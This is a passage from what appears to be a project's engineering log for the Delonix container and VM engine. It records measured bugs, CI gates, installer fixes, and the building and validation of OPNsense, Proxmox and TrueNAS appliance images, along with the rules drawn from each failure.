  does not run; a gate that only runs with everything green sees the path that already cleaned up. #585 set on both
  censuses `if: !cancelled() && (outcome == success || outcome == failure)`. **Rule: a
  step that exists to see what a failure leaves runs after the failure, and that is said in the `if:`,
  not presumed.** Gate: `scripts/test_tmp_roots_gate.py` reads the `ci.yml` and fails if a step that
  calls `tmp_roots_gate.py` does not run after a failure, or if the two censuses stop
  existing — verified with the `if:` removed and with the `ci.yml` from before #585 (rc=1 in both);
- **an empty list on the wrong connection is not «nothing was left»** — #587 censused the domains of
  `qemu:///session` before and after the live test `provider_live.rs` and wrote that nothing was left; the
  test was never there. Without `net_mode`, libvirt's `create` uses `nat` whenever
  `system_libvirt_usable()` (the user is in the `libvirt` group), and therefore `qemu:///system`: I read
  `libvirt_uri_for` alone, without the caller that fills its argument. Measured on 2026-09-28 with
  a `panic!` between the `create` and the `destroy`: `session` stayed empty and `system` was left with
  `dlx-p4spike-libvirt` PERSISTENT and RUNNING, with the disk in a `TempDir` already deleted (QEMU still
  had it open); removed by hand, after confirming by the disk that it was its. And the `0755` that #587
  justified with «system's QEMU is another uid»: the test's QEMU ran as the user themselves
  (measured in `ps` with the VM up) and the test passes with the folder at `0700` — this host's
  `qemu.conf` runs system's QEMU with the uid of whoever calls, although an alien domain runs as `libvirt-qemu`.
  The `0755` stays, because it is what a host with the distribution's default needs. **Rule: a
  census of resources looks in ALL the places where the code can put them (here, the two
  libvirt connections), and the choice read in a function is confirmed in the caller or in the live
  process (`ps`, `virsh -c qemu:///system list`).** Gate: none yet — the domain that a failure leaves
  running is still not closed, because the test's `destroy` only runs with the cycle green; the close is a
  `Drop` guard that destroys it on the connection where it is;
- **a «best-effort» step without a time ceiling is not best-effort — it is a step that HANGS.** The
  `install.sh` said, in a comment, that the editor extension cannot fail the installation of the
  engine, and it called the editor three times without a ceiling: `--list-extensions` inside a `$(…)` and
  `--install-extension` inside an `if`. A launcher that does not recognize a CLI argument opens
  the WINDOW with it and stays in the foreground, and the two wait for the process — the installation of
  the engine hostage to a convenience until someone closes the editor (reported as «the editor opens and the
  installation hangs»). Measured with the REAL block extracted from the script and two fake editors (one that
  hangs on `--version`, another only on `--install-extension`): the previous block was killed from outside
  at 25 s in both cases; the new one gives up in 3 s, says why and carries on. Failing is acceptable in a
  convenience step, hanging is not — and the same goes for stdin: the VS Code launcher does
  `read -r YN` in WSL, and with `curl … | bash` the stdin IS the script. **Rule: every command of a
  program that has a GUI runs with a time ceiling and with stdin closed, and the timeout (124/137)
  is said in different words than a failure** — «did not respond, may have opened a window»
  sends you to close the window, «failed» sends you to look for a broken editor. The editor now also
  PROVES that it speaks CLI (`--version`, 0.14 s on this host) before receiving a `.vsix` path,
  which is the argument a window would open. Gate: `scripts/test_install_editor.py`, which extracts the
  `editor_cli` from `install.sh` itself and requires that no editor invocation bypass it — 7/7
  red against the previous script, 7/7 green after (verified);
- **a filtered output is not the output**, and this is the one that cost the most on
  2026-11-21: six times in a day, across two parallel sessions. **The filter that makes the
  output readable is the same one that hides the line that decides.** The six, each with
  what it cost: a `tail -3` over `cargo test | grep '^test result:'` cut off the FAILED
  line, which came BEFORE six `ok` lines, and produced a confident «nine of these failures
  are my own noise» that was false; a `head -5` over `arch_fitness.py` cut the FAIL list at
  two of four, and the two were what a peer was told; a `grep -c` returning **1** where the
  count was **0** read as a passing check; a second `grep -c` over a multi-line block
  answered for the first line only; a `grep -oE '[0-9]+' | head -1` over
  `char sun_path[108]` returned **86**, which is the `x86_64` of the header's own path; and
  a `grep -A3` over a function whose new comment is seven lines long reported an insertion
  LOST in a merge when it sat intact three lines below the window. The rule this file
  already had — «when a measurement looks too good, turn off the filter and count again» —
  is not enough, because all six were written by sessions that had just cited it. The
  narrower one that holds: **a filter never decides a verdict.** Filter to read if you
  must, but look at the raw output before writing a number down, and when the number is
  going into a message to someone else, print the thing it came from beside it;

**Live finding from the sweep (v0.42.2)**: `delonix system info` reported `cgroup2 delegated: yes`
unconditionally, by reading the host's root cgroup files — the command you run to
diagnose why the limits do not take gave the wrong answer, with confidence. The right function
(`cgroup_limits_apply`) already existed, had ONE caller, and only tested the ROOT path
(`delonix.slice`, which on a rootless host does not even exist) — the same static-vs-dynamic-base error
as `update_limits`. **The probe that discriminates, measured and not deduced**: creating a child is possible
in a delegated scope AND in an SSH session; activating `+memory` fails in BOTH (the *no internal
processes* rule refuses it while our process is in the cgroup — the engine works around it by moving
to a `dlx-mgr`, too invasive for a diagnostic). What separates is the **ownership of
`cgroup.subtree_control`**: `walter:walter` in a `Delegate=yes`, `root:root` in a `session-N.scope`.

**API trap recorded, no live bug**: `reap_orphan_hostfwds` is public and fails OPEN with
an empty list (empty ⇒ everything is an orphan ⇒ deletes everything). This repo's caller is safe (it propagates the error
of `store.list()`, and the comment reasons about it), but it was exactly this shape that made
the published ports die on their own when an external consumer passed it its partial list.

**What the sweep did NOT find**: no other `capture(...)` read by the `Result`; the
remaining `unwrap_or_default()` are all «list to decide what to add», where empty
leads to creating (idempotent) and never to deleting.

**`sudo -v` at the start of `install.sh` is not a precondition — it is a block (2026-08-21)**:
a real bug report, confirmed live on this host (`~/.local/bin/delonix` stuck at v0.59.0, four
releases behind). The script authenticated root AT THE START, unconditionally for any
non-root user — before even knowing whether anything was going to need root. On a `--user`
with all the dependencies already satisfied (the normal case of running the installer again just to
pick up a new release), that died in «sudo authentication failed» without getting to touch the
binary, even with the download/verification/installation itself working perfectly when
tested in isolation (proved with a copy of the logic outside the gate). Fixed by deferring the
authentication to AFTER the binary section — `--user` stops being hostage to dependencies
it will not even touch, and the default path (root) gained an explicit `|| die` guard in the
`install` itself, which became the 1st call to sudo of the script on that path.
## Appliance images (OPNsense, Proxmox, TrueNAS) — v0.47.0

Request: turn installation ISOs into official Delonix VM images. Scripts in
`scripts/appliances/` (with their own README); six images produced and registered.

**What sets them apart from everything else in the `VmImageStore`: they do not run cloud-init.** They install and
configure themselves, by console or web interface. `vm create` **always** generated a
NoCloud seed — the comment itself said «ALWAYS», and for a cloud image that is right (with no datasource
cloud-init skips the network phase and the VM is left without an IP). For an appliance it is an ISO no one reads,
on a CD-ROM that changes the guest's device list for no reason.

- **`VmImage.cloud_init`** (`#[serde(default)]`): `None` — all metadata written to date —
  counts as `true`, so nothing changes for the images this engine has always built (there is a test
  loading an old `.json` and demanding exactly that). With `Some(false)` `vm create` skips
  the seed and **refuses** `--hostname`/`--ssh-key`/`--user-data` NAMING the flags, rather than
  accepting them and throwing them away — the trap this repo has already fixed three times (`--security-opt
  seccomp=`, `-v …:z`, `--network-alias`). `describe` shows the `Cloud-init` line, otherwise the
  refusal reads as arbitrary.
- **`image vm import`** registers a disk this engine did not build, at the three usual entry
  points. The arguments live in a single `flatten`ed `ImportArgs` — writing them three times is how
  those paths diverge. **It compresses with zstd by default** (`--no-compress` not to), for
  the reason already recorded for the golden: a store image is the read-only backing file of every VM
  created from it. Measured: a `convert` without `-c` inflated 646 MiB to **2.15 GiB** on ingest.
- **Metadata in the OCI artifact (manifest annotations)** — `push_oci_artifact_with_annotations`
  / `pull_oci_artifact_with_meta`. It closes outright the already-documented gap of `ubuntu_release`/
  `k8s_version` disappearing on a `vm pull`; for `cloud_init` it was not cosmetic — a published appliance
  got re-seeded on the other side. Read **after** the digest verification, so that
  annotations from a tampered manifest never reach the caller. `cmd_push` already read the
  metadata and did `let _ = img;`: the consumer was what was missing.

**How each one is built** (none assembles a guest by hand — each product installs itself as it
would on metal):

| Appliance | Via | Size |
|---|---|---|
| OPNsense 26.1.2 | official `nano` image (already installed) — zero install | 646 MiB |
| Proxmox VE 9.1 / PBS 4.1 / PMG 9.0 / PDM 1.0 | native auto-install (`answer.toml` on the ISO) | 1.45 / 1.11 / 1.22 / 1.06 GiB |
| TrueNAS SCALE 25.10.5 | the installer's own JSON-RPC | 2.41 GiB |

**Three findings that each cost one build** (all by measurement, none by reading):

1. **The OPNsense `vga`/`serial`/`dvd` images are NOT installed systems** — they boot in live
   mode from the media (`Root file system: /dev/ufs/OPNsense_Install`, «running in live mode
   from install media»). They are the installer in disk form. Only **`nano`** has its root at
   `/dev/ufs/OPNsense_Nano`. I chose `serial` first precisely for assuming the opposite.
2. **The Proxmox ISO does not edit in place.** `xorriso -boot_image any replay` dies on the hybrid
   GPT (`GPT partitions 1 and 2 overlap by 80 blocks`) and `keep` produces an ISO that SeaBIOS
   does not get past `Booting from DVD/CD...` (confirmed by a screendump of the actual screen, not deduced).
   `mkiso.sh` extracts the tree and re-authors the ISO from the
   `-report_el_torito as_mkisofs` recipe of the **original itself** — which is also what makes ONE script
   correct for all four products: they differ in volume id **and** geometry (`-partition_hd_cyl`
   is 110 on VE and **91** on PBS, so fixed values would have produced wrong ISOs). It does away with
   `proxmox-auto-install-assistant`, which is in any case uninstallable on this host (`download.proxmox.com`
   unreachable from here, tested).
3. **TrueNAS has no answer file, but it has an API.** The ISO live's `truenas-installer.service` unit
   is literally `python3 -m truenas_installer --server` — a JSON-RPC server over WebSocket
   on `:8080`, with `install`/`list_disks`/`system_info`/`shutdown`. There is no need to repack
   any squashfs nor to drive the TUI blind.

**Two method traps, from the already-catalogued «X is not Y» family:**

- **A socket that accepts is not a server answering.** QEMU's `hostfwd` accepts the TCP connection
  whether or not anything is listening on the guest, so the `/dev/tcp` probe gave an open port
  at the first second of boot and the WebSocket handshake died right after. It now attempts the real
  handshake on retry.
- **A `modprobe: ERROR:` in a Proxmox installer log is not a failure** — it is the kernel shrugging
  at absent hardware. A `grep -i ERROR:` guard turned three good builds into failed ones.
  Only `ERROR: Installation failed`, `Auto-installation failed` and `unable to continue` are the
  installer's.

**Validated live, and the claim is «it serves», not «it boots»** (`verify-boot.sh`): PBS answers on
:8007 in ~20s, PMG on :8006 in ~30s, PDM on :8443 in ~20s, TrueNAS on :80 in ~50s, and PVE on
:8006 (measured separately, with `pve login:` on the console). Each over an overlay, so the probe never
writes to the image. **OPNsense is the deliberate exception**: its web UI only listens on the LAN, and a
probe from the WAN would get refused — which is the CORRECT behaviour of a firewall, not a failure.
For it the proof was the console: root at `/dev/ufs/OPNsense_Nano`, `LAN (vtnet0) -> 192.168.1.1/24`,
`WAN (vtnet1) -> DHCP4`, and the fingerprint of the already-generated HTTPS certificate.

The appliance path of `vm create` was proven with a real libvirt VM from the OPNsense image: 2 vCPU
and 2 GiB **inherited from the image**, zero `seed.iso` on disk and zero `cdrom` in the domain XML.

**Credentials: known and public** (`root/opnsense` on OPNsense by the vendor's default;
`root`/`truenas_admin` with `delonix-admin` on the rest, set by the answer file/RPC). Same
nature as the k8s golden — documented in the scripts' README, to be changed on first boot.

**Published** at `ghcr.io/angolardevops/delonix-vm-appliances` (2026-08-13). The earlier note gave
this as blocked for want of a PAT with `write:packages` — **the `gh` `angolardevops` account already
has it**, and the path is `gh auth token | delonix image login ghcr.io -u angolardevops
--password-stdin` followed by `image vm push`; ~2m30s per 1.4 GiB image. The remote tag follows
`<full-name>-<short-version>` (`proxmox-ve-9.2`), read from the registry with `ls-remote` and not
invented: `pve` only exists as an argument of the build script, and the script itself once
printed an `import -t pve:9.2` that would have put two names for the same thing in the same listing.

**The builds fetch and VERIFY the media themselves** (`scripts/appliances/fetch-media.sh`, v0.48.0):
before, only OPNsense did it and the other two accepted an ISO no one had checked. Each
vendor publishes the checksum in a different form — Proxmox a GNU `SHA256SUMS` of the directory, TrueNAS a
sidecar with the bare hash, OPNsense the BSD form —, so it is the build script that resolves it and
`fetch-media.sh` that only verifies, fail-closed and with no flag to skip. The match is by
EQUALITY of the name (`awk '$2 == f'`): the Proxmox directory publishes `proxmox-ve_9.2-1.iso` **and**
`proxmox-ve_9.2-1-arm64.iso`, and a `grep` catches both. The version enters the NAME of the output
file, otherwise building 9.2 silently erases the 9.1 image — which forced aligning
`verify-boot.sh`, which had the old names hard-coded and switched to searching by name root,
verifying ALL versions present.

**To do**: a CI workflow that rebuilds these images as `vm-image.yml` already does for the
golden.

## The VM manifest resolved the image differently than the CLI (2026-08-12)

Measured: `delonix vm create x --disk delonix-vm-base:ubuntu-24.04` worked and the SAME name in
`kind: Vm`/`spec.disk` answered `error invalid argument: image not found: …` (exit 4). The root is
a single one — `resolve_vm_disk` returned `spec.disk` raw and never consulted the `VmImageStore`,
while `cmd_create` did `store.get` → `store.qcow2_path` and kept the `image_meta`. The engine
canonicalizes `cfg.disk` on the filesystem, so an image name could never get there.

**The error was the lesser of the two symptoms.** Without `image_meta`, `apply` also did not know
the image is an APPLIANCE, and so it generated a cloud-init seed for it that the CLI loudly refuses:
with the OPNsense qcow2 by absolute path (the natural workaround for the first symptom), the CLI
answered «this image is an appliance and does not run cloud-init, so these would be silently
ignored» and the manifest answered `vm/lab-fwtest: ensured`, rc=0, with a `<disk device='cdrom'>`
and a `seed.iso` attached. The declarative path did exactly the accepted-and-ignored that the CLI
exists to prevent — and the same root kept the image defaults (`VCPUS`/`MEMORY`/
`HYPERVISOR`) with no effect at all via manifest.

- **One function for both** — `resolve_image_ref(store, reference) -> (path, Option<VmImage>)`,
  called by `vm create`, by `resolve_vm_disk` (on BOTH branches: `disk:` and `build:`, which
  returned the tag it had just produced and so also did not boot) and by
  `desired_vm_fields`. It receives the store rather than opening it, so the resolution can be proven against
  a temporary folder instead of depending on whatever images the host happens to have.
- **`spec.vcpus`/`spec.memory` became `Option`** — with `#[serde(default = "…")]` «omitted» and
  «1» are the same thing, and the image default could never apply. It is the same fix
  the clap flags already took (`default_value_t` gone for this exact reason). `--dry-run`
  now prints `vcpus: null` when it is not declared, alongside the other optionals: with
  the effective value depending on the image, printing `1` would be a lie.
- **The reconciler had to move in the same step, or it swapped one bug for a worse one.** `apply`
  records the PATH and the image defaults; a `desired_vm_fields` comparing the raw name would propose
  a `Replace` on every run — and a VM `Replace` is refused without `--replace` precisely
  because it throws away the overlay disk. Both sides now go through the same two functions, in the
  same order, and `desired` never builds (computing a plan cannot create).
- **Validated live** with an isolated `DELONIX_ROOT`, against the XML written in `vms/<name>.xml` and not
  against what the command said: appliance → zero `cdrom`, zero `seed`, `2 vCPU`/`2 GiB` coming from the
  image; control cloud image → `cdrom` with the `seed.iso` and the `4 vCPU` it recommends;
  `stack plan` following the `apply` says `1 unchanged` (rc=0). **Trap for the auditor himself**: the
  first check was `virsh dumpxml | grep -c cdrom`, and `dumpxml` FAILED (domain on another
  URI) — `grep -c` over nothing returns `0`, which reads as «has no cdrom». A zero that comes from a
  failed measurement is not a zero.

**Residue closed next: the refusal was circumventable by the PATH.** The SAME appliance with the same
`hostname:`/`sshKeys:` refused via `disk: opnsense:26.1` and was **accepted** via
`disk: /…/vm-images/opnsense_26.1.qcow2` — rc=0, `ensured`, and the `seed.iso` attached again. And the
absolute path is exactly the workaround someone tries after getting `image not found` with the
name, that is: the check was holed by the very move the previous bug taught. The image
defaults had the same asymmetry. **`resolve_image_ref` now does the reverse lookup** — if
`store.get` fails and the reference is a path, it searches for the store entry whose qcow2 IS that
file (`image_at_path`, canonicalized on both sides, the same idiom as `vms_backed_by` one file
away). It returns **`qcow2_path(name)` and not the canonical path**, so the two spellings give the SAME
string: two strings for the same image read as drift, and a `Vm` drift is a `Replace`, which throws away the
overlay. A qcow2 **outside** the store still resolves to
itself with no metadata — it is not a gap, it is what is known of it: nothing on this host records what an
arbitrary disk is, so there is no appliance flag to read nor defaults to apply. Validated live
with an isolated `DELONIX_ROOT` (both spellings refuse with the same text); the equality of the two
resolved strings is **unit-test** proof and not live — fabricating a VM record by hand
to see the plan gave an empty `vm ls` (the store silently skips a JSON missing fields), and a
proxy that fails is not a measurement.

## A network's subnet started to count, and what that opened up (v0.47.0)

Request: be able to pass CIDRs when creating VMs/networks (`vpc_cidr`, `public_subnets_cidr`,
`private_subnets_cidr`, `single_nat_gateway` — the vocabulary of Terraform's VPC module), so
that an OPNsense VM can act as firewall for a managed network infra without breaking native
ingress/egress.

**The first step was a bug, not a feature**: `--subnet` and `spec.subnet` were accepted and
thrown away with the `bridge` driver — the only one rootless realizes. `create_with_base`
existed for it, said so in its doc-comment, and had **zero callers** (5th occurrence of the pattern).
See the commit `net: a subnet de uma rede passa a valer`. It closed outright an **eternal drift in the
reconciler**: `RECONCILED_NETWORK_FIELDS` already compared `subnet`, so a manifest with `subnet:`
gave a `-/+` plan on every `stack plan` and apply never resolved it.

**And it opened a SECOND, that only the E2E battery caught (2026-08-13).** On gaining the `cidr=` form,
`NetworkStore::get` got a branch that returned from inside the lines loop — and what
was left unrun was the pass that reads the `label.`/`annotation.`. That is, **a network with `cidr=`
came back with no ownership**: `stack apply` stamped `delonix.io/stack`, the following `get` threw it
away, the plan said `exists and belongs to no stack — will be taken over`, and
`--detailed-exitcode` answered **2** over a manifest no one touched. A drift gate in
CI red every day, in the most common case there is (`kind: Network` with `subnet:`). `cidr`
still wins over `base=`; what changed is that the labels are applied before returning.
**Method lesson**: the bug was one `git blame` away from the work that introduced it, and
no unit test reached it — it was the CYCLE (apply → plan) against the real binary that showed it,
which is exactly the reason `scripts/e2e.sh` exists. Running the battery is part of closing a
cycle, it is not optional.

**What the address space allows, and why**: a network's record keeps ONE OCTET,
not a CIDR; everything else (bridge, gateway `.0.1`, IPAM range) is derived. Hence `10.<200-254>.
0.0/16` and nothing more — `172.20.0.0/16` or a `/20` require changing the record format and the IPAM.
The refusal always names the form that works.

**NO-GO measured, with control: OPNsense does not boot under Cloud Hypervisor.** Neither with
`rust-hypervisor-fw` (stuck enumerating PCI, guest never comes up) nor with the **EDK2 `CLOUDHV.fd`** of the
official fork (`gh release download --repo cloud-hypervisor/edk2`) — in both cases zero ARP
entries on the holder and 100% loss. **The control is what makes this a conclusion and not a guess**:
the Linux golden, with the SAME EDK2, answers in ~15s. So the firmware and the plumbing are fine and the
problem is the FreeBSD guest. Since CH is the only way to put a VM on the holder's SDN (with libvirt the
VM lives on `virbr0`, in another netns), **OPNsense cannot today be the gateway of the containers via that
path** — the alternative is `vm bridge` (privileged, EXPERIMENTAL, already E2E validated).

**Side finding that corrects an out-of-date note**: this document said the k8s golden is
«libvirt-only (no hypervisor-fw)». With the EDK2 `CLOUDHV.fd` it **boots under Cloud Hypervisor**
— measured in this session, IP on the SDN in ~15s.

**Why `single_nat_gateway` is refused and not accepted-as-no-op**: on a single node there are no AZs
across which to spread NAT gateways, and a network is a flat bridge, not a set of routed subnets.
Accepting it would be repeating exactly the bug this very session found. `vpcCidr`/
`publicSubnets`/`privateSubnets`/`singleNatGateway` give an error that says what exists here, before the
generic «unknown field — check the spelling» (whoever writes `singleNatGateway` did not misspell;
they have a mental model that does not map).

**The technical point for whoever continues** (public/private subnets + OPNsense as gateway): today
EVERYTHING that leaves takes masquerade on `oifname "tap0"`. If the private workloads start leaving by a
gateway-appliance, the masquerade has to happen **on it** and not before — otherwise it sees all the traffic
with a single IP and its per-source rules stop counting. The per-workload chains (`fwcont`) are
FILTER, not NAT, so they compose well: delonix decides whether the packet leaves the workload, the
appliance decides what crosses the border.

## OS base images, and what the host needs to build them (v0.47.0)

Five `--no-k8s` variants: Ubuntu 24.04/26.04, Debian bookworm, Rocky 9 and **Fedora** (new).
Fedora is of Rocky's dnf/RPM family and the code says so rather than repeating it — there is a test
comparing the generated steps for the two field by field.

**`--fedora-release` requires `<release>-<build>` (`42-1.1`) and refuses a bare `42`.** Measured: the
artifact name carries a build that the version does not determine, and the Fedora redirector does not serve
a directory listing. With no reliable way to discover it, a `42` alone looks right and gives a 404 with
hundreds of MB already transferred — it asks instead of guessing (same principle as the ISO inputs
in the appliances workflow).

**Two host blockers, and neither is guessable from the error it gives** (both now handled by
`install.sh --with-image-build`):

- **Without `isc-dhcp-client` ON THE HOST**, the supermin appliance is born without a DHCP client — the
  `supermin.d/packages` asks for it and supermin only COPIES from the host. The build dies with «Temporary failure
  resolving 'archive.ubuntu.com'», an error that looks like the host's network, and the host has network.
- **`/boot/vmlinuz-*` at `0600`** (Debian/Ubuntu hardening): supermin copies the host's kernel
  to the appliance and dies with `cp: cannot open ... Permission denied`. The `chmod 0644` **lowers a
  boundary** (the kernel binary becomes readable by any local user), so it is opt-in,
  warns and says how to revert — the same treatment as `--low-ports`.

**`install.sh --production`** applies the limits that are only hit under LOAD, each by a concrete
failure mode: `nf_conntrack_max` (the whole dataplane is nftables with conntrack — full, the kernel
DROPS new connections and on the application side it looks like random loss), `neigh gc_thresh` (the
ARP table has 1024 entries and a dense node fills it), `ip_local_port_range` (each outbound connection via
NAT spends an ephemeral port), `pid_max`/`file-max`/backlogs/`swappiness`. The **conntrack `hashsize`
goes via `modprobe.d` because it is NOT a sysctl** — raising only the max lengthens the hash chains instead of
scaling. `LimitNOFILE`/`TasksMax` go into a `user@.service` drop-in: in rootless the
containers are its children, and the limits of a PAM/SSH session do not reach them.

**`install.sh --performance` / the three questions (Enter = yes).** Measured on a Ryzen 9 laptop
(32 threads): `powersave` governor, `power` EPP and `power-saver` profile out of the box — the CPU is
capped upstream, and no `--production` sysctl compensates for it. Without `--performance` nor
`--no-performance` the installer ASKS three things, each with default yes: CPU in performance
mode (governor + EPP + `powerprofilesctl`), THP in `madvise` + irqbalance, and the GC timer
(`system prune --auto --threshold 75`, user, `systemctl --global enable`). **With no terminal the
answer is NO** (`ask_yn` reads from `/dev/tty`, because `curl | bash` occupies stdin): the installer does not
change a machine's governor with no one to say yes. What is written to sysfs is not a
sysctl and does not survive a reboot, so it lives in a service (`delonix-performance.service`,
helper `/usr/local/sbin/delonix-performance`) that saves the BOOT state and restores it on `stop`:
`systemctl disable --now delonix-performance` reverts. The power profile applies BEFORE the
governor — the power-profiles-daemon rewrites both when switching profile. `install.sh` also warns
of a different `delonix-cri`/`-mcp`/`-mgmt` elsewhere on the PATH, by comparing content:
**never with `--version`, which `delonix-cri` ignores and starts the server.**

**Two real bugs caught while building**, both with a regression test:

1. **`stream_download` had no retry at all.** The Rocky cloud image (646 MiB) died at
   3.8 MiB and the next run restarted from zero (`download_*_base` only checks the FINAL
   file). It now requests `Range:` from what is on disk, with 5 attempts; a 206 is
   resumed and a server that ignores the Range restarts — the distinction is explicit, because appending to
   a complete body would produce silent garbage. What makes this safe is the **checksum that every
   caller already verifies**: bytes stitched from two ranges either give the published hash or the
   download is discarded. Proven live: `resuming download at 3964627 bytes`.
2. **The `machine-id` reset broke the build on Fedora**: `/var/lib/dbus` does not exist there, the
   `ln -sf` failed and took the whole `virt-customize` down — the image did not come to exist because
   of a compatibility symlink. Same class as the AppArmor trap on Rocky. `mkdir -p`
   before the link.

**`image vm ls`/`ls-remote` started to say what the image IS.** `ls` gained `TYPE`
(`cloud-init`/`appliance`) and `DEFAULTS` (`4cpu/8G`) — the two things that decide whether `vm create`
seeds the image (and therefore whether `--ssh-key` is accepted or refused) and with what resources it boots. The
`ls-remote` stopped printing only the TAG column: it reads each tag's manifest (one GET, no blob) and
shows distro/type/size from the annotations; a tag whose manifest fails still appears with `-`.
`KERNEL` is now also populated on an `import`, via `virt-ls /boot` — and **fails for a structural
reason** on OPNsense (FreeBSD) and TrueNAS (root on ZFS), where libguestfs does not see `/boot`;
on Proxmox VE it works (`vmlinuz-6.17.2-1-pve`, measured).

## Provisioning storage on a NAS (`kind: Volume` + `spec.provision`, ADR-0009)

Until now a `kind: Volume` with `nfs:` knew how to **mount** a share and required that someone had
made it by hand. The `provision.truenas` block (OPTIONAL — without it this Kind behaves exactly as
before) creates the dataset, the quota, the owner/mode and the export. **The mount does not change**: `server` and
`share` are DERIVED from what the appliance reported and follow the usual `share_mount`/`ensure_mounted`
— there is no second mount mechanism. Its own crate `delonix-truenas`; the
`delonix-volume` gains no DIRECT dependency (the transitive tree stays identical — the 9 lines of
`reqwest`/`hyper`/`tokio` it already had arrive via `opentelemetry-otlp`, and writing «the engine crate
stays clean of reqwest» would be false).

**Exercised against a REAL TrueNAS SCALE 25.10.5 appliance** (the one this repo builds), and it is the
findings of the real target that shape the design:

- **There are operations that are async jobs.** `POST /filesystem/setperm` answers `99` — an id, not
  a result. Treating that number as success is reporting permissions applied before whatever is
  going to happen happens, and a job that fails does so later, where no one is looking.
- **The permissions endpoint CHANGED**: `/pool/dataset/permission/id/{id}` is 404 on 25.10, it is now
  `/filesystem/setperm`. It is the concrete reason the client **pins a major** (`SUPPORTED_MAJOR`) in
  rather than being liberal.
- **The quota has a MINIMUM of 1 GiB** — 512 MiB returns a 422 with three pydantic constraints.
  Validated on our side before any request, and **refused rather than rounded**.
- **The numeric properties are objects whose number can be `null`**: with no quota it comes as
  `{"parsed": null, "rawvalue": "0"}`. Reading the string would turn «no limit» into «limit of zero
  bytes» — the same distinction as `Usage { bytes, unreadable }`. **The quota is always RE-READ from the NAS**,
  never echoed from the request, and it is the re-read value that apply prints.

**Destructive path** (`volumes rm --destroy-remote`): the default NEVER destroys the remote. Ownership is
a stamp — `delonix.io/provisioned-by` in the volume's annotations, written by the same `set_metadata`
the reconciler already uses for `last-applied`, with no new record. With no stamp there is nothing to
destroy and the command says so. The stamp carries **only references** (url, dataset, the secret's NAME); the
credential is resolved again at destroy time, so a rotated key works. **The order is the remote first
and the local record last** — the record is the only thing that says WHICH dataset on WHICH appliance belongs to
this volume, and deleting it first would leave an orphan dataset with nothing pointing at it (the rule the
audit of the 208 subcommands left written).

**`delonix-runtime-sec` pass, three findings, two with a reproduced exploit:**

1. **Remote panic on the ERROR path** — the response summaries sliced the String by BYTE
   index; a cut inside a multi-byte character panics (measured: 159 bytes of ASCII plus
   an `é`). Since the body comes from the other side, any server turned an error into a crash — in
   the code that exists to REPORT what went wrong. `truncate_chars` steps back to the boundary.
2. **The URL carried the credential wherever it pointed.** The `url:` comes from the manifest and names where
   the secret is SENT. That it be configurable is inherent (like a `docker login` registry),
   but two forms with no legitimate use are now refused: **`http://` with credential** (it went in
   clear) and **userinfo in the URL** (a password in the manifest under another name, and the classic way for
   a URL to READ as one host and REACH another).
3. **Adoption was not visible.** `ensure_dataset` aligns the quota of whatever it FINDS: a manifest that
   names `tank/producao` silently re-limits a dataset that is not its own. Nothing on the NAS side
   marks a dataset as ours, so it cannot be prevented here — but it now **warns**, which is the
   difference between a documented behaviour and a surprise.

**`truenas_destroy` chaos scenario** (skips with an audible line without `DELONIX_CHAOS_TRUENAS_URL/USER/
PASS`), and each step queries the NAS over HTTP rather than believing what the CLI says it did.
Verified by the repo's rule: `if destroy_remote` → `if true` makes «a normal rm destroyed the
dataset on the NAS» fail; removing the stamp requirement makes «--destroy-remote accepted a volume with no
provisioning» fail.

**Bug of the design itself, caught while validating**: a `provision:` with no `share:` provisions the dataset and
exports nothing — and an `nfs:` block was derived anyway, trying to mount an export never
published. `Provisioned` now says whether it exported.

**Host limitation, not the code's**: `mount -t nfs` needs CAP_SYS_ADMIN, so in a pure rootless
the apply of an NFS volume fails on the mount (pre-existing behaviour). That is why the provisioning
report comes out **before** the mount — an apply that died there having already created dataset, quota
and export would leave the operator not knowing anything had been created at all.

**To do**: `cifs:`/SMB (only NFS is provisioned); creating the pool (it is a decision of physical-disk
layout, not of a volume manifest); and a second target (the block is named by the destination, so it
enters as a sibling key, not as a `type:` to keep in sync).


## The Proxmox appliances, and what «OK» does not prove (2026-08-11)

Two defects in the four published Proxmox images, both found by
BOOTING an image and looking at it — not by reading code:

1. **They carried a STATIC IP from the build environment.** The answer file's `source = "from-dhcp"`
   means «obtain the configuration by DHCP DURING the installation and
   write it as static», not «use DHCP at boot». A VM booted by
   `delonix vm create --backend libvirt` came up with `10.0.2.15` — QEMU's
   slirp address — and was unreachable. The guest's own console
   announced it (`https://10.0.2.15:8006/`); I spent five iterations guessing
   (interface name, network config) before looking. **`--vnc` +
   `virsh screenshot` is the tool for this**, and it gave the answer in 30s.
2. **Without `console=ttyS0`**, a guest that fails the network is not observable at
   all without a graphics device — which is what made diagnosing defect 1
   take an hour.

`scripts/appliances/proxmox_postinstall.py` (SSH + pexpect, in the window where the
old address is still valid) rewrites `interfaces` to DHCP, forces
`net.ifnames=0` (**DHCP alone is not enough**: the bridge names a physical port,
and `ens18` on one hypervisor is `enp0s3` on the next — `eth0` is the only
true name everywhere), adds the serial console with getty, and regenerates the
SSH host keys on the 1st boot (they were generated at build, so all images
would present the SAME identity).

**Three mistakes of mine in this series, and all three are of the same family — asserting without
measuring:**

- **`dpkg-reconfigure openssh-server` hangs** (the unit stayed in
  `activating` forever) and, while it hangs, sshd has no host keys and
  REFUSES to start. A hardening step that brings down the service is worse than the
  exposure it closed. `ssh-keygen -A` does the same in an instant.
- **PBS/PMG/PDM do not ship a DHCP client.** The installer configures static and
  never needs one; writing `inet dhcp` without `dhclient` gives a bridge that
  comes up, with `eth0` inside, and **zero IPv4** — while the
  `networking.service` reports `Finished`. PVE works because, being a
  hypervisor, it ships the client: **I validated one of the four and generalized**. The
  post-install now ensures the client and **fails closed** if it cannot
  install it.
- **My fix script said `OK` by looking at the post-install's `rc`, and
  not at the result.** It was the dishonest reporting this repo chases, written
  by me. A script that fixes images has to BOOT them and confirm what
  matters (IP by DHCP on a network other than the build's, and the service answering)
  before replacing anything — and not replace when it fails.

**Rule that stays**: an image fix is only done when the corrected
image boots in an environment other than the one where it was corrected. The `rc` of
a build script is evidence of nothing.

**And the trap that cost the most time of all, because the fix was
correct**: after a `systemctl poweroff` over SSH, the script waited
`sleep 12` and captured the disk. **SSH closing is the guest saying goodbye,
not the machine stopping** — `qemu-img convert` ran over a still-open
image and captured a filesystem mid-write. Result: images that
booted and never reached the network, for a fix that was fine. Three
wrong hypotheses before finding it (interface name, `/sbin/dhclient`,
bridge with no member), and the one that hit was comparing the cycle that PASSED with the one that
failed, rather than looking once more inside the guest — which was
always fine. **Waiting for time instead of for a condition, in the operation that captures
the result.** `build-proxmox.sh` already did `wait $QEMU_PID` and was correct;
